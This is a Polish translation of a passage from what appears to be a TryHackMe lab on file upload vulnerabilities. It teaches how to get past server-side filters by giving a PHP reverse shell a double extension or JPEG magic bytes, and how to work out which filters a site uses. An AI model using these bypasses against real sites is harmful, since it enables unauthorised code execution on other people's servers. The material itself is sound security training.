W tym przypadku okazuje się, że nie ma rozszerzeń powłoki, które byłyby jednocześnie wykonywane i niefiltrowane, więc wracamy do deski kreślarskiej.

W poprzednim przykładzie widzieliśmy, że kod używał pathinfo()funkcji PHP do pobrania kilku ostatnich znaków po ., ale co się stanie, jeśli dane wejściowe zostaną przefiltrowane nieco inaczej?

Spróbujmy przesłać plik o nazwie shell.jpg.php. Wiemy już, że akceptowane są pliki JPEG, więc co jeśli filtr po prostu sprawdza, czy .jpgrozszerzenie pliku znajduje się gdzieś w danych wejściowych?

Pseudokod tego typu filtra może wyglądać mniej więcej tak:

ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput
IF STRING ".jpg" IS IN VARIABLE userInput:
    SAVE THE FILE
ELSE:
    RETURN ERROR MESSAGE

Próbując przesłać plik, otrzymujemy komunikat o powodzeniu. Przejście do /uploadskatalogu potwierdza, że ​​ładunek został pomyślnie przesłany:

Aktywując ją otrzymujemy naszą powłokę:

To w żadnym wypadku nie jest wyczerpująca lista luk w zabezpieczeniach związanych z przesyłaniem plików. Jak w przypadku wszystkiego, co wiąże się z hakowaniem, staramy się wykorzystać luki w kodzie napisanym przez innych; kod ten może być napisany specjalnie dla danego zadania. To naprawdę ważny wniosek z tego zadania: istnieje milion różnych sposobów na zaimplementowanie tej samej funkcji w programowaniu – sposób wykorzystania musi być dostosowany do używanego filtra. Kluczem do obejścia każdego filtra po stronie serwera jest enumeracja i sprawdzenie, co jest dozwolone, a co blokowane, a następnie próba stworzenia ładunku, który spełni kryteria filtru.

Teraz Twoja kolej. Znasz już procedurę – wymyśl i omiń filtr, aby przesłać i aktywować powłokę. Twoja flaga jest w /var/www/. Strona, do której uzyskujesz dostęp, to annex.uploadvulns.thm.

Pamiętaj, że to zadanie po raz pierwszy wdrożyło również losowy schemat nazewnictwa. Na razie nie powinieneś mieć problemu ze znalezieniem swojej powłoki, ale pamiętaj, że katalogi nie zawsze będą indeksowalne...

Przyjrzeliśmy się już filtrowaniu rozszerzeń po stronie serwera, ale skorzystajmy z okazji i zobaczmy, w jaki sposób sprawdzanie magicznych liczb można zaimplementować jako filtr po stronie serwera.

Jak wspomniano wcześniej, liczby magiczne służą do dokładniejszego identyfikatora plików. Liczba magiczna pliku to ciąg cyfr szesnastkowych i zawsze znajduje się na samym początku pliku. Wiedząc o tym, można użyć liczb magicznych do walidacji przesłanych plików, po prostu odczytując te kilka pierwszych bajtów i porównując je z białą lub czarną listą. Należy pamiętać, że ta technika może być bardzo skuteczna w przypadku…PHPoparty na serwerze WWW; jednakże czasami może nie działać w przypadku innych typów serwerów WWW (wskazówka).

Przyjrzyjmy się przykładowi. Jak zwykle mamy stronę do przesyłania:

![](https://assets.tryhackme.com/additional/imgur/yQnQGsn.png)

Zgodnie z oczekiwaniami, po przesłaniu standardowego pliku shell.php pojawia się błąd; jednak po przesłaniu pliku JPEG strona go obsługuje. Jak dotąd wszystko działa zgodnie z oczekiwaniami.

Z poprzedniej próby przesłania wiemy, że pliki JPEG są akceptowane, więc spróbujmy dodać magiczny numer JPEG na początku naszego `shell.php`pliku. Szybki rzut oka na [listę sygnatur plików w Wikipedii(otwiera się w nowej karcie)](https://en.wikipedia.org/wiki/List_of_file_signatures)pokazuje nam, że istnieje kilka możliwych magicznych liczb w plikach JPEG. Nie powinno mieć znaczenia, którą z nich tutaj użyjemy, więc wybierzmy jedną ( `FF D8 FF DB`). Moglibyśmy dodać reprezentację ASCII tych cyfr (ÿØÿÛ) bezpośrednio na początku pliku, ale często łatwiej jest pracować bezpośrednio z reprezentacją szesnastkową, więc omówmy tę metodę.

Zanim zaczniemy, sprawdźmy `file`typ pliku naszej powłoki za pomocą polecenia Linux:

![](https://assets.tryhackme.com/additional/imgur/2126EHS.png)

Zgodnie z oczekiwaniami polecenie informuje nas, że typ pliku to PHP. Należy o tym pamiętać podczas dalszych wyjaśnień.

Widzimy, że wybrana przez nas magiczna liczba ma długość czterech bajtów, więc otwórzmy skrypt powłoki odwrotnej i dodajmy cztery losowe znaki w pierwszym wierszu. Te znaki nie mają znaczenia, więc w tym przykładzie użyjemy po prostu czterech „A”:

![](https://assets.tryhackme.com/additional/imgur/oe434wu.png)

Zapisz plik i wyjdź. Następnie ponownie otworzymy plik w programie `hexeditor`(który jest domyślnie dostępny w Kali) lub w dowolnym innym narzędziu umożliwiającym podgląd i edycję powłoki w formacie heksadecymalnym. W hexeditorze plik wygląda tak:

![](https://assets.tryhackme.com/additional/imgur/otIyN96.png)

Zwróć uwagę na cztery bajty w czerwonym polu: wszystkie to `41`, co jest kodem szesnastkowym wielkiej litery „A” – dokładnie tym, co dodaliśmy wcześniej na początku pliku.

Zamień to na liczbę magiczną, którą znaleźliśmy wcześniej dla plików JPEG:`FF D8 FF DB`

![](https://assets.tryhackme.com/additional/imgur/2OlGKdQ.png)

Teraz, jeśli zapiszemy i wyjdziemy z pliku (Ctrl + x), możemy go użyć `file`ponownie i zobaczyć, że udało nam się pomyślnie sfałszować typ pliku naszej powłoki:

![](https://assets.tryhackme.com/additional/imgur/ldyt88v.png)

Świetnie. Teraz spróbujmy wgrać zmodyfikowaną powłokę i sprawdźmy, czy ominie filtr!

![](https://assets.tryhackme.com/additional/imgur/Coat5LI.png)

No i mamy to – ominęliśmy filtr liczb magicznych po stronie serwera i otrzymaliśmy odwrotną powłokę.

Udaj się do `magic.uploadvulns.thm`-- czas na ostatnie mini-wyzwanie.

---

To będzie ostatnia przykładowa strona internetowa, którą musisz zhakować przed wyzwaniem w zadaniu jedenastym; w związku z tym po raz kolejny podnosimy poziom podstawowego bezpieczeństwa. Strona internetowa w poprzednim zadaniu zaimplementowała zmieniony schemat nazewnictwa, dodając datę i godzinę przesłania pliku przed nazwą pliku. To zadanie nie będzie tego robić, aby było stosunkowo proste; jednak indeksowanie katalogów zostało wyłączone, więc nie będziesz mógł przejść do katalogu zawierającego przesłane pliki. Zamiast tego będziesz musiał uzyskać dostęp do powłoki bezpośrednio za pomocą jej URI.

Omiń filtr „magic number”, aby przesłać powłokę. Znajdź lokalizację przesłanej powłoki i aktywuj ją. Twoja flaga jest w `/var/www/`.

Poznaliśmy już różne rodzaje filtrów – zarówno po stronie klienta, jak i serwera – a także ogólną metodologię ataków polegających na przesyłaniu plików. W kolejnym zadaniu otrzymasz do rozwiązania zadanie polegające na przesłaniu pliku metodą „czarnej skrzynki”, więc skorzystajmy z okazji, aby omówić przykładową metodologię podejścia do tego typu wyzwania nieco bardziej szczegółowo. Możesz opracować własną alternatywę dla tej metody, jednak jeśli dopiero zaczynasz swoją przygodę z tego typu atakami, poniższe informacje mogą okazać się przydatne.  

Przyjrzymy się temu krok po kroku. Załóżmy, że otrzymaliśmy stronę internetową do przeprowadzenia audytu bezpieczeństwa.

1. Pierwszą rzeczą, którą zrobilibyśmy, byłoby przyjrzenie się witrynie jako całości. Korzystając z rozszerzeń przeglądarki, takich jak wspomniany Wappalyzer (lub ręcznie), szukalibyśmy wskaźników języków i frameworków, w których mogła zostać zbudowana aplikacja internetowa. Należy pamiętać, że Wappalyzer nie zawsze jest w 100% dokładny. Dobrym początkiem ręcznego wyliczenia tych danych byłoby wysłanie żądania do witryny i przechwycenie odpowiedzi za pomocą Burpsuite. Nagłówki, takie jak `server`lub , `x-powered-by`mogą być wykorzystane do uzyskania informacji o serwerze. Szukalibyśmy również wektorów ataku, takich jak na przykład strona przesyłania danych.  
    
2. Po znalezieniu strony przesyłania danych, chcielibyśmy ją dokładniej zbadać. Na początek warto przejrzeć kod źródłowy skryptów po stronie klienta, aby ustalić, czy istnieją jakieś filtry, które można ominąć, ponieważ mamy nad tym pełną kontrolę.
3. Następnie podjęlibyśmy próbę zupełnie nieszkodliwego przesłania pliku. Z tego miejsca sprawdzilibyśmy, w jaki sposób uzyskiwany jest do niego dostęp. Innymi słowy, czy możemy uzyskać do niego dostęp bezpośrednio z folderu „przesłane”? Czy jest on osadzony gdzieś na stronie? Jaki jest schemat nazewnictwa witryny? W tym miejscu mogą się przydać narzędzia takie jak Gobuster, jeśli lokalizacja nie jest od razu oczywista. Ten krok jest niezwykle ważny, ponieważ nie tylko poszerza naszą wiedzę o atakowanym wirtualnym krajobrazie, ale także daje nam punkt odniesienia w postaci „zaakceptowanego” pliku, na którym możemy oprzeć dalsze testy.
    - Ważną funkcją Gobustera jest przełącznik `-x`, którego można użyć do wyszukiwania plików o określonych rozszerzeniach. Na przykład, jeśli dodałeś `-x php,txt,html`polecenie Gobuster, narzędzie doda znaki `.php`, `.txt`i `.html`do każdego słowa z wybranej listy słów, po jednym na raz. Może to być bardzo przydatne, jeśli udało Ci się przesłać ładunek, a serwer zmienia nazwy przesyłanych plików.
4. Po ustaleniu, jak i gdzie można uzyskać dostęp do przesłanych plików, podjęlibyśmy próbę złośliwego przesłania pliku, omijając wszelkie filtry po stronie klienta, które znaleźliśmy w kroku drugim. Spodziewalibyśmy się, że przesyłanie zostanie zatrzymane przez filtr po stronie serwera, ale wyświetlany komunikat o błędzie może być niezwykle przydatny w ustaleniu dalszych kroków.

Zakładając, że serwer zatrzymał przesyłanie naszego złośliwego pliku, poniżej przedstawiamy kilka sposobów sprawdzenia, jaki rodzaj filtra po stronie serwera może być zastosowany:

- Jeśli uda Ci się przesłać plik z całkowicie nieprawidłowym rozszerzeniem (np. `testingimage.invalidfileextension`), istnieje prawdopodobieństwo, że serwer używa _czarnej listy_ rozszerzeń do filtrowania plików wykonywalnych. Jeśli przesyłanie się nie powiedzie, filtr rozszerzeń będzie działał na białej liście.
- Spróbuj ponownie przesłać pierwotnie zaakceptowany, nieszkodliwy plik, ale tym razem zmień jego magiczną liczbę na taką, która będzie filtrowana. Jeśli przesyłanie się nie powiedzie, oznacza to, że serwer używa filtra opartego na magicznej liczbie.
- Podobnie jak w poprzednim punkcie, spróbuj przesłać swój nieszkodliwy plik, ale przechwyć żądanie za pomocą Burpsuite i zmień MIM Typ przesyłanego pliku, który ma być filtrowany. Jeśli przesyłanie się nie powiedzie, oznacza to, że serwer filtruje na podstawie typów MIME.
- Wyliczanie filtrów długości pliku polega na przesłaniu małego pliku, a następnie przesyłaniu coraz większych plików, aż do napotkania filtra. Wtedy będziesz wiedzieć, jaki jest dopuszczalny limit. Jeśli masz dużo szczęścia, komunikat o błędzie podczas pierwotnego przesyłania może od razu wskazać limit rozmiaru. Pamiętaj, że mały limit długości pliku może uniemożliwić przesłanie odwrotnej powłoki, z której korzystaliśmy do tej pory.  

Powinieneś teraz być dobrze przygotowany do podjęcia wyzwania w zadaniu jedenastym.

No i to już koniec. Mam nadzieję, że nauczyliście się czegoś z tego pokoju. To było bardzo krótkie wprowadzenie do podstaw luk w zabezpieczeniach związanych z przesyłaniem plików – jest jeszcze wiele do nauczenia! Wykorzystajcie zdobytą tutaj wiedzę, aby zbadać bardziej zaawansowane exploity związane ze złośliwym przesyłaniem plików.

---

Teraz, gdy już ukończyłeś pracę nad pokojem, pamiętaj, aby cofnąć zmiany wprowadzone w `hosts`pliku w Zadaniu 1.

Dla przypomnienia podajemy polecenia, które to umożliwiają.

W systemie Linux lub MacOS:

`sudo sed -i '$d' /etc/hosts`

W systemie Windows:

`(GC C:\Windows\System32\drivers\etc\hosts | select -Skiplast 1) | SC C:\Windows\System32\drivers\etc\hosts`
